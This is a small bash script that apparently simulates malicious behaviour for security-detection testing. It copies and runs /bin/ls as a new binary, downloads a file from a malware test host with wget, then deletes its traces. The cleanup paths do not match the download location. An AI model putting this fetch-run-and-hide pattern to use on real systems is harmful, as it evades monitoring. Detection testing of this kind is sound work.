#!/bin/bash

LOG_NAME="malicious.log"

while true
do
	echo "NEW BINARY WILL BE HERE!" >> $LOG_NAME
        cp /bin/ls ./ls_drifted
	echo "DRIFTED !" >> $LOG_NAME
        cat /proc/cpuinfo
	./ls_drifted
	sleep 10
	
        wget http://malware.wicar.org/data/vlc_amv.html
	echo "MALWARE DOWNLOADED !" >> $LOG_NAME
	cat /veryMalicious/vlc_amv.html

	sleep 90
        echo "CLEANING UP! No one will see me..."
	rm ./ls_drifted
        rm /veryMalicious/vlc_amv.html
	sleep 30000
done
